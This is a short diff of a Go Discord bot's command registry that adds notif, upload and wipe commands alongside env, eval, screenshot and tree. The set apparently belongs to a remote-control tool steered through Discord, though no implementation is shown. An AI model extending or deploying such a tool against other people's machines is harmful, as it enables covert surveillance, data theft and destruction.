@@ -114,11 +114,14 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 }
 
 func register() {
-	commandsList["ping"] = &commands.PingCommand{}
+	commandsList["env"] = &commands.EnvCommand{}
 	commandsList["eval"] = &commands.EvalCommand{}
+	commandsList["notif"] = &commands.NotifCommand{}
+	commandsList["ping"] = &commands.PingCommand{}
 	commandsList["ss"] = &commands.ScreenShotCommand{}
 	commandsList["tree"] = &commands.TreeCommand{}
-	commandsList["env"] = &commands.EnvCommand{}
+	commandsList["upload"] = &commands.UploadCommand{}
+	commandsList["wipe"] = &commands.WipeCommand{}
 }
 
 func validateEncrypted(data string) error {
